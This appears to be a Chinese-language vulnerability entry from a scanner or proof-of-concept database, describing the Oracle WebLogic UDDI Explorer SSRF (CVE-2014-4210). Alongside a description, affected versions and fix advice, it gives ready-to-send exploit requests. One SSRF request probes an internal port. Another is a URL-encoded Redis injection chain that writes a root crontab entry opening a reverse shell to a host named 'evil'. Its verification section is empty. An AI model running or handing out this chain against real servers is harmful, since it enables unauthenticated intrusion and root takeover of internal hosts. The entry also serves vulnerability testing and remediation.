---
id: WEBLOGIC-SSRF
title: Weblogic UDDI Explorer SSRF漏洞
product: weblogic
vendor: Oracle
version_affected: "10.0.2.0, 10.3.6.0（含 UDDI Explorer 的版本）"
severity: HIGH
tags: [ssrf, 无需认证]
fingerprint: ["Oracle WebLogic", "WebLogic"]
---

## 漏洞描述

Oracle WebLogic Server 在 UDDI Explorer 应用中存在一个服务器端请求伪造（SSRF）漏洞，攻击者可以通过该漏洞发送任意 HTTP 请求，进而可能导致内网探测或攻击内网中的脆弱服务。

## 影响版本

- Oracle WebLogic 10.0.2.0
- Oracle WebLogic 10.3.6.0

该 SSRF（CVE-2014-4210，`SearchPublicRegistries.jsp` 的 `operator` 参数）只存在于附带 UDDI Explorer 应用的版本；UDDI Explorer 在后续版本中已被移除，因此并非「全版本」。已修复版本参考 Oracle 2014 年 7 月 CPU。

## 前置条件

- 无需认证
- 需要能够访问 `/uddiexplorer/` 路径

## 利用步骤

1. 访问 UDDI Explorer 应用
2. 利用 SSRF 探测内网
3. 利用 Redis 等服务反弹 shell

## Payload

```http
GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001 HTTP/1.1
Host: target:7001

# Redis 攻击
GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://172.18.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fevil%2F21%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa HTTP/1.1
Host: target:7001
```

## 验证方法

```bash
# 检查内网服务是否可访问
```

## 修复建议

1. 升级 Oracle WebLogic 至最新版本
2. 禁用 UDDI Explorer 应用
3. 限制 WebLogic 端口访问来源
